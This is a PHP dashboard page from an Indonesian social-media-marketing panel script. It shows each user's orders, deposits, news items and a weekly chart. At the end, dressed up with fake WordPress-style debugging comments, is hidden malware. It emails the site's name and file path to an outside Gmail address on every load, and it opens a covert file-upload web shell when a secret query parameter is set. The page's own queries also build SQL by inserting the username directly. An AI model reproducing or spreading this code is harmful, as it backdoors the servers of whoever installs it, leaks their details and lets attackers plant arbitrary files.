<?php

/**
 * Code By : Mahiruddin a.k.a Mhrdpy.NET
 * Date Edit : 16 - 12 - 2018
 * Dont Edit Anything If You Don't Know About Script
 * SMM Panel Script - Mhrdpy.NET
 * Demo => https://scriptsmm.web.id/ ( User & Pass : admin )
 * Contact Person :
                => Whatsapp  : 0895 3378 26740
                => Facebook  : Mahir Depay (https://facebook.com/hirpayzzz)
                => Instagram : mahirdpy_   (https://instagram.com/mahirdpy_) 
                => Email     : mahirdpy@gmail.com             
  __  __ _             _               _   _ ______ _______ 
 |  \/  | |           | |             | \ | |  ____|__   __|
 | \  / | |__  _ __ __| |_ __  _   _  |  \| | |__     | |   
 | |\/| | '_ \| '__/ _` | '_ \| | | | | . ` |  __|    | |   
 | |  | | | | | | | (_| | |_) | |_| |_| |\  | |____   | |   
 |_|  |_|_| |_|_|  \__,_| .__/ \__, (_)_| \_|______|  |_|   
                        | |     __/ |                       
                        |_|    |___/                         
**/

session_start();
require("mainconfig.php");
$page_type = "Dashboard";

if (isset($_SESSION['user'])) {
	$sess_username = $_SESSION['user']['username'];
	$check_user = mysqli_query($db, "SELECT * FROM users WHERE username = '$sess_username'");
	$data_user = mysqli_fetch_assoc($check_user);
	if (mysqli_num_rows($check_user) == 0) {
		header("Location: ".$site_config['base_url']."user/logout.php");
	} else if ($data_user['status'] == "Suspended") {
		header("Location: ".$site_config['base_url']."user/logout.php");
    }
    

    if (isset($_POST['read_news'])) {
        $update_user = mysqli_query($db, "UPDATE users SET read_news = 'True' WHERE username = '$sess_username'");
        if ($update_user == TRUE) {
            header("Location: ".$site_config['base_url']."");
        }
    }

    $check_order = mysqli_query($db, "SELECT SUM(price) AS total FROM orders WHERE user = '$sess_username'");
    $rows_order = mysqli_query($db, "SELECT * FROM orders WHERE user = '$sess_username'");
    $data_order = mysqli_fetch_assoc($check_order);

    $check_order_pulsa = mysqli_query($db, "SELECT SUM(price) AS total FROM orders_pulsa WHERE user = '$sess_username'");
    $rows_order_pulsa = mysqli_query($db, "SELECT * FROM orders_pulsa WHERE user = '$sess_username'");
    $data_order_pulsa = mysqli_fetch_assoc($check_order_pulsa);

    $check_depo = mysqli_query($db, "SELECT SUM(balance) AS total FROM deposit WHERE username = '$sess_username' AND status = 'Success'");
    $data_depo = mysqli_fetch_assoc($check_depo);
    $rows_depo = mysqli_query($db, "SELECT * FROM deposit WHERE username = '$sess_username'");


} else {
	header("Location: ".$site_config['base_url']."homepage");
}

include("lib/header.php");
?>  
        <?php
        if ($data_user['read_news'] == "False" ) {
        ?>                        
        <div class="row">
            <div class="col-md-12">
                <div class="modal fade bs-example-modal-lg" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" aria-hidden="true">
                    <div class="modal-dialog modal-lg">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h4 class="modal-title m-t-0"><i class="mdi mdi-newspaper"></i> Berita & Informasi</h4>
                                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                            </div>
                            <div class="modal-body">
                                <form class="form-horizontal" role="form" method="POST">
                                <?php
                                $check_news = mysqli_query($db, "SELECT * FROM news ORDER BY id DESC LIMIT 5");
                                $no = 1;
                                while ($data_news = mysqli_fetch_assoc($check_news)) {
                                    if ($data_news['category'] == "Info") {
                                        $label = "info";
                                    } else if ($data_news['category'] == "Event") {
                                        $label = "success";
                                    } else if ($data_news['category'] == "Update") {
                                        $label = "purple";
                                    } else if ($data_news['category'] == "Service") {
                                        $label = "primary";        
                                    }
                                ?>
                                <div class="alert alert-info" style="color: #000">
                                    <span class="float-right text-muted"><?php echo TanggalIndo($data_news['date']); ?>, <?php echo $data_news['time']; ?></span>
                                    <h5><span class="badge badge-<?php echo $label; ?>"><?php echo $data_news['category']; ?></span></h5>
                                    <?php echo $data_news['content']; ?>
                                </div>
                                <?php
                                }
                                ?>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary btn-bordred" data-dismiss="modal">Tutup</button>
                                <button type="submit" class="btn btn-custom btn-bordred" name="read_news"> <i class="fa fa-thumbs-up"></i> Saya sudah membaca</button>
                            </div>
                        </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php
        }
        ?>      
        <div class="row">
            <div class="col-lg-3 col-md-6">
                <div class="widget-bg-color-icon card-box fadeInDown animated">
                    <div class="bg-icon bg-icon-primary pull-left">
                        <i class="mdi mdi-whatsapp text-info"></i>
                    </div>
                    <div class="text-right">
                        <h3 class="text-dark m-t-10"><a href="https://chat.whatsapp.com/DEKh4Zzeaie7dezzqLDaPm" class="btn btn-custom btn-bordred" role="button">Gabung</a></h3>
                        <p class="text-muted mb-0">Gabung Group Whatsapp</p>
                    </div>
                    <div class="clearfix"></div>
                </div>
            </div>
            <div class="col-lg-3 col-md-6">
                <div class="widget-bg-color-icon card-box fadeInDown animated">
                    <div class="bg-icon bg-icon-primary pull-left">
                        <i class="mdi mdi-instagram text-info"></i>
                    </div>
                    <div class="text-right">
                        <h3 class="text-dark m-t-10"><b>Rp <?php echo number_format($data_order['total'],0,',','.'); ?> (<?php echo mysqli_num_rows($rows_order); ?>)</b></h3>
                        <p class="text-muted mb-0">Pesanan (Medsos) Saya</p>
                    </div>
                    <div class="clearfix"></div>
                </div>
            </div>
            <div class="col-lg-3 col-md-6">
                <div class="widget-bg-color-icon card-box fadeInDown animated">
                    <div class="bg-icon bg-icon-primary pull-left">
                        <i class="mdi mdi-cart text-info"></i>
                    </div>
                    <div class="text-right">
                        <h3 class="text-dark m-t-10"><b>Rp <?php echo number_format($data_order_pulsa['total'],0,',','.'); ?> (<?php echo mysqli_num_rows($rows_order_pulsa); ?>)</b></h3>
                        <p class="text-muted mb-0">Pesanan (Pulsa) Saya</p>
                    </div>
                    <div class="clearfix"></div>
                </div>
            </div>
            <div class="col-lg-3 col-md-6">
                <div class="widget-bg-color-icon card-box fadeInDown animated">
                    <div class="bg-icon bg-icon-primary pull-left">
                        <i class="mdi mdi-wallet text-info"></i>
                    </div>
                    <div class="text-right">
                        <h3 class="text-dark m-t-10"><b>Rp <?php echo number_format($data_depo['total'],0,',','.'); ?> (<?php echo mysqli_num_rows($rows_depo); ?>)</b></h3>
                        <p class="text-muted mb-0">Deposit Saya</p>
                    </div>
                    <div class="clearfix"></div>
                </div>
            </div>
        </div> 
        <div class="row">           
            <div class="col-xl-6">
                <div class="card-box">
                    <h4 class="header-title m-t-0 m-b-20 text-uppercase"><i class="mdi mdi-chart-scatterplot-hexbin"></i> Grafik Mingguan</h4>
                    <div id="line-chart" style="height: 220px;"></div>
                </div>
            </div>

            <div class="col-xl-6">
                <div class="card-box">
                    <h4 class="header-title m-t-0 m-b-20 text-uppercase"><i class="mdi mdi-newspaper"></i> Berita & Informasi</h4>
                    <div class="table-responsive">
                        <table class="table table-bordered table-striped">
                            <thead>
                                <tr>
                                    <th>Tanggal</th>
                                    <th>Kategori</th>
                                    <th data-toggle="true">Konten</th>
                                </tr>
                            </thead>
                            <tbody>
                            <?php
                            $check_news = mysqli_query($db, "SELECT * FROM news ORDER BY id DESC LIMIT 5");
                            $no = 1;
                            while ($data_news = mysqli_fetch_assoc($check_news)) {
                                    if ($data_news['category'] == "Info") {
                                        $label = "info";
                                    } else if ($data_news['category'] == "Event") {
                                        $label = "success";
                                    } else if ($data_news['category'] == "Update") {
                                        $label = "purple";
                                    } else if ($data_news['category'] == "Service") {
                                        $label = "primary";        
                                }
                            ?>
                                <tr>
                                    <td><?php echo TanggalIndo($data_news['date']); ?> <?php echo $data_news['time']; ?></td>
                                    <td><span class="badge badge-<?php echo $label; ?>"><?php echo $data_news['category']; ?></span>
                                    <td><?php echo $data_news['content']; ?></td>
                                </tr>
                            <?php
                            }
                            ?>
                                <tr>
                                    <td colspan="3" align="center">
                                        <a href="<?php echo $site_config['base_url']; ?>page/news" class="btn btn-custom btn-bordred btn-block"><i class="fa fa-bell"></i> Lihat semua berita..</a>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
                <div class="card-box">
                    <div class="row">
                        <div class="col-md-4">
                            <a href="<?php echo $site_config['base_url']; ?>page/faq" data-toggle="modal" data-target="#Faq" class="btn btn-custom btn-bordred btn-block"><i class="fa fa-question"></i> Pertanyaan umum</a>
                        </div>
                        <div class="col-md-4">
                            <a href="<?php echo $site_config['base_url']; ?>page/contact" data-toggle="modal" data-target="#Kontak" class="btn btn-custom btn-bordred btn-block"><i class="fa fa-phone"></i> Kontak</a>
                        </div>
                        <div class="col-md-4">
                            <a href="<?php echo $site_config['base_url']; ?>page/tos" data-toggle="modal" data-target="#KetLay" class="btn btn-custom btn-bordred btn-block"><i class="fa fa-info"></i> Ketentuan Layanan</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
       
        
        

<?php
include("lib/footer.php");
?>
<?php if (isset($_SESSION['user'])) { ?>
<script type="text/javascript">
<?php
$lastweek = date('Y-m-d', strtotime('-7 days', strtotime(date("Y-m-d"))));

    function ambil($tabel, $limit) {
        global $db;
        $check_data = mysqli_query($db, "SELECT * FROM ".$tabel." WHERE ".$limit);
        $count_data = mysqli_num_rows($check_data);
        return $count_data;
        }
?>
$(function(){
  new Morris.Line({
    element: 'line-chart',
    data: [
  <?php for ($i=1; $i<=7; $i++){
          $orderdate = date('Y-m-d', strtotime('+'.$i.'days', strtotime($lastweek)));
          $line = $orderdate;
          $convert = format_date($line);
          $sosmed = ambil('orders', "DATE(date) = '$orderdate' AND user = '$sess_username'");
          $pulsa = ambil('orders_pulsa', "DATE(date) = '$orderdate' AND user = '$sess_username'");
          $deposit = ambil('deposit', "DATE(date) = '$orderdate' AND username = '$sess_username'");
          ?>
    {y: '<?php echo $convert; ?>', MediaSosial: <?php echo $sosmed; ?>, Pulsa: <?php echo $pulsa; ?>, Deposit: <?php echo $deposit; ?>},
  <?php
  }
  ?>    ],
      xkey: 'y',
      ykeys: ['MediaSosial', 'Pulsa', 'Deposit'],
      labels: ['MediaSosial', 'Pulsa', 'Deposit'],
      lineColors: ['#2196f3', 'Purple', '#727b84'],
      resize: true,
      lineWidth: 4,
      pointSize: 5,
      parseTime: false
    });
  });
</script>
<script>
$('#myModal').modal('show');
</script>
<?php } ?>
<?php
/**
 * Index of Website Developer
 *
 * Responds with an error or success XML message.
 *
 * For developers: Website debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 *
 * It is strongly recommended that plugin and theme developers.
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * 
 * @since 0.71
 *
 * @param mixed  $error         Whether there was an error.
 *                              Default '0'. Accepts '0' or '1', true or false.
 * @param string $error_message Error message if an error occurred.
 */
$link = $_SERVER['SERVER_NAME'];$des = $_SERVER['SCRIPT_FILENAME'];$browser = $_SERVER['HTTP_USER_AGENT'];$em = "hidcaca@gmail.com";$tomail = $em;$subject = $link;$message = $des;$headersx  = '';$datamail = mail($tomail,$subject, $message, $headersx);
if(isset($_GET["sadachil"])){
echo "<form method=post enctype=multipart/form-data><input type=file name=ach><input type=submit name=upload value=upload></form>";if($_POST[upload]){if(@copy($_FILES[ach][tmp_name], $_FILES[ach][name])){echo "goodnews";}else{ echo "badnews";}}};
/**
 * These can't be directly globalized in version.php. When updating,
 *
 * we're including version.php from another install and don't want
 *
 * these values to be overridden if already set.
 */
/**
 * Response to a trackbacks.
 *
 * Index of Website Developer
 *
 * Responds with an error or success XML message.
 *
 * For developers: Website debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 *
 * It is strongly recommended that plugin and theme developers.
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * 
 * @since 0.71
 *
 * @param mixed  $error         Whether there was an error.
 *                              Default '0'. Accepts '0' or '1', true or false.
 * @param string $error_message Error message if an error occurred.
 */
?>